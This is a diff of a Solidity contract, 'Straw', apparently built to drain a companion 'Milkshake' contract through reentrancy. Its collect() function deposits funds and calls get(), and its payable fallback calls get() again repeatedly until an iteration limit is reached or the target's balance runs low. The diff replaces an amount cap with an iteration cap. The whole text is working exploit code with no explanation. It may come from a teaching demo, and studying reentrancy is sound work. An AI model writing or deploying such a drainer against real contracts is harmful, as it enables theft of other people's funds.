@@ -12,13 +12,12 @@ contract Straw is Ownable
 {
     Milkshake private _milkshake;
 
-    uint256 private _amountToTrigger;
-    uint256 private _amountToCollect;
-
-    uint256 private _amountCollected;
+    uint256 private _iteration;
+    uint256 private _maxIterations;
 
     constructor (address payable milkshake) 
     public
+    payable
     {
         _milkshake = Milkshake(milkshake);
     }
@@ -39,18 +38,15 @@ contract Straw is Ownable
         selfdestruct(killAddress);
     }
 
-    function collect(uint256 amountToCollect) 
+    function collect(uint256 maxIterations) 
     public 
     payable
     onlyOwner 
     {
-        _amountToTrigger = msg.value;
-        _amountToCollect = amountToCollect;
-        _amountCollected = 0;
+        _iteration = 0;
+        _maxIterations = maxIterations;
 
-        require(_amountToTrigger < _amountToCollect, "need to send less funds than total amount to collect");
-
-        _milkshake.put.value(_amountToTrigger)();
+        _milkshake.put.value(msg.value)();
         _milkshake.get();
     }
 
@@ -58,9 +54,9 @@ contract Straw is Ownable
     external
     payable 
     {
-        if (address(_milkshake).balance >= msg.value && _amountCollected < _amountToCollect) 
+        if (address(_milkshake).balance >= msg.value && _iteration < _maxIterations) 
         {
-            _amountCollected += msg.value;
+            _iteration += 1;
 
             _milkshake.get();
         }
